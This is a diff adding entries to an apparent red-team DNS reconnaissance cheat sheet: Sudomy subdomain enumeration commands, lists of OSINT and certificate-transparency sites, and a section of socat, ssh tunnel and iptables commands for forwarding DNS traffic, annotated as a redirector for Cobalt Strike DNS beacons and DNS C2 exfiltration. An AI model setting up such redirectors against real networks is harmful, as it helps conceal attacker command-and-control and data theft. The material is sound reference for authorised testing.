@@ -21,6 +21,8 @@ dig +multi +dnssec A domain.name
 dig +dnssec  @ns1.domain.name sub.domain.name
 dig +short NSEC sub.domain.name
 dig +short NSEC api.nasa.gov |  awk '{print $1;}' | sed -e 's/\.$//'
+for i in `cat FULL` ;do echo "IP$i";nslookup $i|grep 'name ='|sed 's/.*name = /,/g'|sed 's/\.$//g';done| tr -d '\n' | awk '{gsub("IP","\n"); print}'
+	--nslookup to csv
 	
 	
 	OSINT
@@ -112,6 +114,9 @@ Archival (DNS Aggregators, public datasets)
 	https://whoisxmlapi.com/
 		https://github.com/fathom6/inetdata
 
+Archival + CT logs:
+	sudomy -s Shodan,VirusTotal,Censys,Certspotter,BinaryEdge,Hackertarget,Threatminer,CrtSH,DnsDB,BufferOver,Findsubdomains,Threatcrowd,Dnsdumpster,Riddler,Entrust,Webarchive,SecurityTrails -d target.dom
+
 Forward DNS
 	https://scans.io/study/sonar.fdns_v2
 		--Rapid7 Forward DNS dataset
@@ -187,6 +192,7 @@ dnsrecon -d example.com -D /usr/share/wordlists/dnsmap.txt -t std --xml dnsrecon
 wfuzz -c -z file,/path/to/SecLists/Discovery/DNS/subdomains-top1mil-20000.txt -Z -u http://FUZZ.site.domain | grep -v '0 L'
 amass -active -brute -o hosts.txt -d domain.name
 python altdns.py -i target.domains -o data_output -w target.cewl.words -r -s results_output.txt
+sudomy -nP -d target.dom -b /path/to/word.list
 
 	SPF (Sender Policy Framework) Records
 	https://github.com/0xbharath/assets-from-spf
@@ -233,6 +239,13 @@ massdns
 	massdns -r resolvers.txt -t AAAA -w results.txt domains.txt
 		--resolve AAAA records
 	subbrute.py names.txt target.dom | ./bin/massdns -r resolvers.txt -t A -a -o -w results.txt -
+Sudomy
+	export GOPATH=$HOME/go
+	export PATH=$PATH:$GOROOT/bin:$GOPATH/bin
+	go get -u github.com/tomnomnom/httprobe
+	go get -u github.com/OJ/gobuster
+	git clone --recursive https://github.com/screetsec/Sudomy.git
+	sudomy -a -d target.dom
 	
 
 	
@@ -253,6 +266,7 @@ inception
 
 Web databases
 https://dnsdumpster.com
+https://shodan.io
 https://securitytrails.com/
 https://www.robtex.com/
 https://www.robtex.com/dns/
@@ -262,7 +276,15 @@ https://www.netcraft.com/
 https://data.iana.org/TLD/tlds-alpha-by-domain.txt
 http://ipv4info.com/
 https://findsubdomains.com/
-
+https://sslmate.com/certspotter
+https://censys.io
+https://threatminer.org
+http://dns.bufferover.run
+https://hackertarget.com
+https://www.entrust.com/ct-search/
+https://www.threatcrowd.org
+https://riddler.io
+https://www.binaryedge.io
 
 Block Lists
 https://rbls.org/
@@ -328,6 +350,26 @@ DNS Attacks:
 	Random subdomain attack
 	Domain lock-up attack
 	Botnet-based CPE attack
+
+
+DNS REQ/RES FORWARDING:
+	SOCAT
+socat udp4-recvfrom:53,reuseaddr,fork udp4-sendto:111.11.1.11; echo -ne
+	--forward dns requests recieved by host to target
+		--e.g. forwarding to Cobalt Strike DNS beacons or and DNS C2 Exfiltration applicaiton
+#server
+socat -t0 -T0 tcp-listen:6667,reuseaddr,fork UDP:localhost:53
+ssh usr@redirect.dom -R 6667:localhost:6667
+#redirecting host
+socat -t0 -T0 udp4-recvfrom:53,reuseaddr,fork tcp:localhost:6667
+	--DNS redirect behind NAT
+	IPTABLES
+iptables -I INPUT -p udp -m udp --dport 53 -j ACCEPT
+iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination <IP-GOES-HERE>:53
+iptables -t nat -A POSTROUTING -j MASQUERADE
+iptables -I FORWARD -j ACCEPT
+iptables -P FORWARD ACCEPT
+sysctl net.ipv4.ip_forward=1
 
 
 Appendix:
